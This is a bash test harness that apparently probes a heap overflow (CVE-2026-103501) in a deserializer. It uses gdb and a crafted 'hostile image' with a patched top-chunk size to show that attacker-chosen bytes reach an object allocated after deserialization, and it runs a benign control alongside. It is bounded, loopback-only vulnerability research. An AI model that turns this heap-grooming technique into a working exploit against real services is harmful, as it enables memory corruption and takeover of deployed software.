#!/usr/bin/env bash
# Bounded typed-object adjacency probe for CVE-2026-103501. Loopback only:
# every service binds 127.0.0.1 and the driver dials only that port.
# Answers: can the forward overflow reach a typed object that was live before
# deserialization, and what does a typed object allocated afterwards contain?
set -uo pipefail
HERE=$(cd "$(dirname "$0")" && pwd)
OUT=${1:-"$HERE/out"}
mkdir -p "$OUT"
OUT=$(cd "$OUT" && pwd)
BIN="$OUT/victim_plain"
PATCH=40=00,41=f0,42=01,43=00,44=00,45=00,46=00,47=00  # top size 0x1f000
pass=0; fail=0
check() {
  if [ "$2" -eq 1 ]; then echo "PASS $1"; pass=$((pass + 1));
  else echo "FAIL $1"; fail=$((fail + 1)); fi
}
val() { grep -o "$1=[^ ]*" "$2" | head -1 | cut -d= -f2; }

bash "$HERE/build.sh" "$OUT" || exit 2
g++ -std=c++11 -O0 -g -I"$OUT/v52/hll/include" -I"$OUT/v52/common/include" \
  "$HERE/victim_service.cpp" -o "$BIN" || exit 2

# 1. gdb: establish the address order. The live typed object must sit below
#    the coupon vector; the overflow only writes forward.
python3 "$HERE/drive.py" --bin "$BIN" --port 38161 --count 64 --value 90 \
  --seed "$OUT/seed.bin" --gdb-script "$HERE/gdb_victim.gdb" \
  --patch "$PATCH" > "$OUT/victim_gdb.log" 2>&1
L="$OUT/victim_gdb.log"
V=$(val GDB_VICTIM_ADDR "$L"); P=$(val GDB_COUPON_DATA "$L"); S=$(val GDB_SBRK "$L")
ok=0
if [ -n "$V" ] && [ -n "$P" ] && [ -n "$S" ] && \
   [ "$((V))" -lt "$((P))" ] && [ "$((P))" -lt "$((S))" ] && \
   grep -q 'VICTIM_AFTER_ADDR=.*marker=1122334455667788' "$L" && \
   grep -q 'VICTIM_AFTER_ADDR=.*fp=0x' "$L"; then ok=1; fi
check "gdb: live victim below coupon below sbrk; victim fields unchanged" "$ok"

# 2. Hostile image with a plausible patched top size: the typed object
#    allocated AFTER deserialization receives the attacker's chosen bytes.
python3 "$HERE/drive.py" --bin "$BIN" --port 38162 --count 64 --value 90 \
  --seed "$OUT/seed.bin" --patch "$PATCH" > "$OUT/victim_hostile.log" 2>&1
L="$OUT/victim_hostile.log"
ok=0
if grep -q 'REQUEST_ADDR=.*a=5a5a5a5a5a5a5a5a b=5a5a5a5a5a5a5a5a' "$L" && \
   grep -q 'VICTIM_AFTER_ADDR=.*marker=1122334455667788' "$L" && \
   grep -q 'service_rc=0' "$L"; then ok=1; fi
check "hostile: post-deserialize POD fields are chosen 0x5a; victim intact; rc 0" "$ok"

# 3. Benign control: same consumer, unmodified count-2 image.
python3 "$HERE/drive.py" --bin "$BIN" --port 38163 --count 2 --value 90 \
  --seed "$OUT/seed.bin" > "$OUT/victim_benign.log" 2>&1
L="$OUT/victim_benign.log"
ok=0
if grep -q 'REQUEST_ADDR=' "$L" && \
   ! grep -q 'a=5a5a5a5a5a5a5a5a' "$L" && \
   grep -q 'VICTIM_AFTER_ADDR=.*marker=1122334455667788' "$L" && \
   grep -q 'service_rc=0' "$L"; then ok=1; fi
check "benign count 2: no chosen bytes in POD; victim intact; rc 0" "$ok"

echo "TOTAL PASS=$pass FAIL=$fail"
[ "$fail" -eq 0 ] && { echo "ALL_CHECKS_PASS"; exit 0; }
echo "SOME_CHECKS_FAILED"; exit 1
